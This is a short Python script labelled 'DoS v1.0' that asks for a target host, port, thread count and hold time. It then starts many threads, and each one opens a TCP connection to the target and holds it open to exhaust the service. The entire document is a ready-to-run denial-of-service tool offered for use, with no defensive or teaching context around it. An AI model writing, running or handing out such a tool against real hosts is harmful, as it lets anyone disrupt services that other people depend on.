#!/usr/bin/env python
# -*- encoding: utf-8 -*-
import socket
import time
from threading import Thread

print('DoS v1.0\n')
host = input('Host: ')
port = int(input('Port: '))
threads = int(input('Number of Threads: '))
t = int(input('Connection Time: '))

def connect(i):
	try:
		print('Thread #%d: Attacking...' % i)
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.connect((host,port))
		time.sleep(t)
		sock.close()
	except:
		print('Cannot connect to %s...' % host)
def attack():
	print('\nStarting DoS attack...\n')
	for i in range(threads):
		t = Thread(target=connect, args=(i,))
		t.start()

attack()